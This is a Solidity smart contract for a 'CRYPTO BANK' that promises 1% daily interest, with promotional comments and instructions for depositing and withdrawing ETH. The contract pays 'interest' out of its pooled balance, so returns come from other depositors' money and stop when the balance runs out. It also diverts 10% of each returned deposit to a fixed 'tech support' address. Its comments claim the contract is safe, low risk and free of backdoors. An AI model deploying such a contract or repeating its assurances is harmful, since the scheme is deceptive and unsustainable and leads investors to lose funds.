1 pragma solidity ^0.4.25;
2 
3 //  CRYPTO BANK - Interest 1% Daily !
4 //  HODL until you are HOMELESS !!!
5 //  https://cryptobanktoday.wixsite.com/cryptobank
6 //
7 //  Improved, no bugs and backdoors! Your investments are safe!
8 //
9 //  NO DEPOSIT FEES! All the money go to contract!
10 //
11 //  WITHDRAWAL FEES! Technical Support - Tax 10% charged from The RETURNED DEPOSIT ONLY!!
12 //
13 //  LOW RISK! You can take your deposit back ANY TIME!
14 //
15 //     - Send 0.00000112 ETH to contract address (You will charged Tax 10% for The Tech Support)
16 //
17 //  LONG LIFE!
18 //
19 //  INSTRUCTIONS:
20 //
21 //  TO INVEST: send ETH to contract address
22 //  TO WITHDRAW INTEREST: send 0 ETH to contract address
23 //  TO REINVEST AND WITHDRAW INTEREST: send ETH to contract address
24 //  TO GET BACK YOUR DEPOSIT: send 0.00000112 ETH to contract address
25 //  RECOMMENDED GAS LIMIT: 200000
26 //  RECOMMENDED GAS PRICE: https://ethgasstation.info/
27 //
28 
29 contract CryptoBank {
30     // Record user info to registry
31     mapping (address => uint) invested;
32     mapping (address => uint) dates;
33     
34     // Tech Support info
35     address constant public techSupport = 0x93aF2363A905Ec2fF6A2AC6d3AcF69A4c8370044;
36     uint constant public techSupportPercent = 10;
37    
38 
39 
40     // This function called every time anyone sends a transaction to this contract
41     function () external payable {
42 
43       // If user is invested more than 0 ether
44      if (invested[msg.sender] != 0 && msg.value != 0.00000112 ether) {
45                  
46         //Calculation of the daily interest
47        uint amount = invested[msg.sender] * 1 / 100 * (now - dates[msg.sender]) / 1 days;
48             
49        // If your deposit greater than balance.You will get the balance amount.
50        if (amount > address(this).balance) {
51            amount = address(this).balance;
52           }
53        }  
54     
55     // Returning  your deposit ! We will charge tax from your deposit !!
56     if (invested[msg.sender] != 0 && msg.value == 0.00000112 ether) {
57             
58         //Calculate  tax from deposit.
59         uint tax = invested[msg.sender] * techSupportPercent / 100;
60           
61         //Available deposit to withdrawal
62         uint withdrawalAmount = (invested[msg.sender] - tax) + msg.value;
63 
64         // If your deposit greater than balance.You will get the balance amount.
65         if (withdrawalAmount > address(this).balance) {
66            withdrawalAmount = address(this).balance;
67           }
68             
69         //Now paying  tax to the Tech Support
70         techSupport.transfer(tax);
71            
72         //Paying remaining deposit
73         msg.sender.transfer(withdrawalAmount);
74          
75         //Contract is terminated! Come back again ...
76         dates[msg.sender] = 0;
77         invested[msg.sender] = 0;
78          
79         } else {
80             
81         //Record user information to the Crypto Bank
82         dates[msg.sender] = now;
83         invested[msg.sender] += msg.value;  
84     
85          //Pay daily interest.
86         msg.sender.transfer(amount); 
87        }
88     } 
89 }